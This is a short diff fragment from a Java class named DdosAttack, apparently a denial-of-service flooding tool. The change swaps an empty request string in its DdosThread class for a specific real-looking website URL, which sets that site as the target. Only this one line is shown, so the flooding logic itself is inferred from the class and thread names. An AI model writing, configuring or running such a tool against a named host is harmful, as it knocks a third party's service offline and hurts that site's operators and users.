@@ -19,7 +19,7 @@ public class DdosAttack {
     public static class DdosThread extends Thread {
 
         private AtomicBoolean running = new AtomicBoolean(true);
-        private final String request = " ";
+        private final String request = "http://army2.toantran.net/";
         private final URL url;
 
         String param = null;
